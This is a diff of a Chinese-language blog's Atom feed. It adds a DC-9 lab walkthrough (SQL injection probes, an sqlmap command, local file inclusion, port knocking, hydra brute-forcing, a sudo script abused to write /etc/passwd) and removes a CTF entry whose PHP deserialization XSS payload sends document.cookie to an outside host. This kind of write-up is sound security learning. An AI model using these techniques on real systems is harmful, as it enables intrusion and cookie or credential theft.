@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>ev11ccaatt</title>
-    <updated>2021-04-18T12:31:10.578Z</updated>
+    <updated>2021-04-22T06:47:39.474Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -10,6 +10,61 @@
     <logo>https://ev11ccaatt.github.io/images/avatar.png</logo>
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ev11ccaatt</rights>
+    <entry>
+        <title type="html"><![CDATA[DC-9 ]]></title>
+        <id>https://ev11ccaatt.github.io/post/dc-9/</id>
+        <link href="https://ev11ccaatt.github.io/post/dc-9/">
+        </link>
+        <updated>2021-04-22T06:47:11.000Z</updated>
+        <content type="html"><![CDATA[<p>dd上来扫一扫<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422124211775.png" alt="image-20210422124211775" loading="lazy">没有什么奇怪的东西，那么先去访问一下看下有什么东西。</p>
+<p>提供了一个员工表，和一个search页面，怀疑有sql注入之类那么来试试，</p>
+<p>分别填入Fred' and 1=1# 和Fred' and 1=2# 对应的分别回显信息，和0 results。</p>
+<p>可以判断存在注入，这个看起来不是很难，那就先用sqlmap跑一下</p>
+<pre><code>sqlmap -u http://192.168.187.138/results.php --data=&quot;search=1&quot; --dbs
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422125635781.png" alt="image-20210422125635781" loading="lazy"></figure>
+<p>那么登录看一下</p>
+<p><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422130458128.png" alt="image-20210422130458128" loading="lazy">在这里可以添加记录，但是试了下没有什么用，这时候看到下方一直是 File does not exist</p>
+<p>那么试试有没有LFI，<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422130607298.png" alt="image-20210422130607298" loading="lazy"></p>
+<p>如图，可以读出相应内容，但是用户太多了，密码也不知道，这时候就要用上前面的sqlmap的另一个库的数据了。</p>
+<p>分别把username和password导出来，尝试用hydra来爆破一下,</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422132445274.png" alt="image-20210422132445274" loading="lazy"></figure>
+<p>关闭了22端口</p>
+<p>猜测使用了knockd隐藏了22端口，那么我们直接 读下/etc/default/knockd看看存不存在<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422133446813.png" alt="image-20210422133446813" loading="lazy"></p>
+<p>有提到一个配置文件</p>
+<p>读取一下，<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422133547921.png" alt="image-20210422133547921" loading="lazy"></p>
+<p>得到了敲门顺序，那么用nmap去挨个敲门</p>
+<pre><code>nmap -p 7469 192.168.187.138
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422134033412.png" alt="image-20210422134033412" loading="lazy"></figure>
+<p>这时候就可以用hydra试试爆破了</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422134929799.png" alt="image-20210422134929799" loading="lazy"></figure>
+<p>在janitor发现一个密码本<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422135409923.png" alt="image-20210422135409923" loading="lazy">\</p>
+<p>用新的密码去打一下看看<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422135722390.png" alt="image-20210422135722390" loading="lazy"></p>
+<p>在joeyt的home下没找到有用的东西，那么换成fredf试试,试了后也没有什么，那看看有什么免密root执行的</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422140314200.png" alt="image-20210422140314200" loading="lazy"></figure>
+<pre><code>import sys
+
+if len (sys.argv) != 3 :
+    print (&quot;Usage: python test.py read append&quot;)
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], &quot;r&quot;)
+    output = (f.read())
+
+    f = open(sys.argv[2], &quot;a&quot;)
+    f.write(output)
+    f.close()
+</code></pre>
+<p>这就是读一个文件然后以root权限写到另一个文件，那么可以考虑一下直接覆盖root，或者创建一个root权限的用户。</p>
+<p><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422142739333.png" alt="image-20210422142739333" loading="lazy">这里以本机的来做个参考</p>
+<p>那么先创建个<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422143256062.png" alt="image-20210422143256062" loading="lazy">，然后<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422143654020.png" alt="image-20210422143654020" loading="lazy"></p>
+<p>后续我测试的时候没有成功</p>
+<p>然后尝试往/etc/passwd写入用户<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210422144629799.png" alt="image-20210422144629799" loading="lazy"></p>
+<p>但是失败了，后面再修。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[DC-4]]></title>
         <id>https://ev11ccaatt.github.io/post/dc-4/</id>
@@ -241,30 +296,6 @@ print(flag)
 </code></pre>
 <p>得到一个And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</p>
 <p>访问得到flag.</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[BJDCTF 2nd]xss之光]]></title>
-        <id>https://ev11ccaatt.github.io/post/bjdctf-2ndxss-zhi-guang/</id>
-        <link href="https://ev11ccaatt.github.io/post/bjdctf-2ndxss-zhi-guang/">
-        </link>
-        <updated>2021-04-06T06:58:03.000Z</updated>
-        <content type="html"><![CDATA[<p>进去没有信息，抓个包看下，当时第一是发现 Server: openresty 找了几个payload看了下，貌似不是这里。</p>
-<p>那么还是老办法吧，扫目录。</p>
-<p>开奖了，有git文件泄露.</p>
-<p>发现就一个文件</p>
-<pre><code>&lt;?php
-$a = $_GET['yds_is_so_beautiful'];
-echo unserialize($a);
-</code></pre>
-<p>一番搜索发现是php原生类的利用,<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p>
-<p>由于是php5.6那么构造</p>
-<pre><code>&lt;?php
-$a = new Exception(&quot;&lt;script&gt;window.open('http://99cb3fc4-b241-4edb-aa24-b550de1ef186.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;&quot;);
-$b = serialize($a);
-echo urlencode($b);
-</code></pre>
-<p>即可，传入后在cookie可以看到flag.</p>
 ]]></content>
     </entry>
 </feed>
